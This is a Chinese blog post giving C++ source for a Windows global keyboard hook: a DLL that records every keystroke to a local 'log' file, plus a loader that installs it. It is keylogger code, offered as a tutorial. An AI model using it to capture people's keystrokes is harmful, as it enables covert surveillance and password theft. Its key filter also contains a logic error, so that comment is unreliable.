# 一个简单的全局键盘钩子  

代码大部分来自[CSDN](https://blog.csdn.net/jazrynwong/article/details/84890304)，根据实际运行情况做了些修改。
对于IE 浏览器，飞秋等应用失效，也不清楚是什么原因  

## 创建dll(Mo.Hook.Dll)  

- dllmain.cpp  

```c++
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"

#include <stdio.h>
#include <windows.h>
#include "Mo.Hook.Dll.cpp"

#define _CRT_SECURE_NO_WARNINGS

HINSTANCE hinstance; // dll 实例
HHOOK hhook; // 钩子实例
HANDLE hfile; // 文件句柄
FILE* pFile = NULL; // 文件指针

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // dll加载后在当前目录下创建一个用于保存记录的文件
        hfile = CreateFileA("log", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        hinstance = (HINSTANCE)hModule;
        CloseHandle(hfile);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

LRESULT CALLBACK KeyboardProc(int ncode, WPARAM wparam, LPARAM lparam)
{
    if (ncode >= 0)
    {
        // 按键释放时进入
        if (!(lparam & 0x80000000))
        {
            // 处理字母和数字
            if (wparam >= 48 && wparam <= 57 || wparam >= 65 || wparam <= 90)
            {
                // 打开文件，fopen 在新版本会报错
                fopen_s(&pFile, "log", "a+");
                // 写入按键
                char save = wparam;
                fwrite(&save, 1, 1, pFile);
                // 关闭文件
                fclose(pFile);
            }
        }
    }
    // 调用下一个钩子
    return CallNextHookEx(hhook, ncode, wparam, lparam);
}

void HookStart()
{
    hhook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, (HINSTANCE)GetModuleHandleA("Mo.Hook.Dll.dll"), 0);
}

void HookStop()
{
    if (hhook)
    {
        UnhookWindowsHookEx(hhook);
        hhook = NULL;
    }
}
```

- Mo.Hook.Dll.cpp  

```c++
// Mo.Hook.Dll.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"

#define _CRT_SECURE_NO_WARNINGS
#ifndef hook
extern "C" _declspec(dllimport) void HookStart();
extern "C" _declspec(dllimport) void HookStop();

#endif

```

## 创建空桌面应用程序  

- Mo.Hook.cpp  

```c++
#include "stdafx.h"
#include <Windows.h>

typedef void (*HOOK)();
HMODULE mydll = NULL;
HOOK sethook = NULL;
HOOK unhook = NULL;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{
    mydll = GetModuleHandleA("Mo.Hook.Dll.dll"); //动态链接hook.dll
    if (!mydll)
    {
        mydll = LoadLibraryA("Mo.Hook.Dll.dll");
    }
    sethook = (HOOK)GetProcAddress(mydll, "HookStart");
    unhook = (HOOK)GetProcAddress(mydll, "HookStop");
    sethook();
    MessageBox(NULL, TEXT("安装钩子成功！"), TEXT("Hi!"), MB_OK | MB_ICONINFORMATION);
    unhook();
    return 0;
}
```
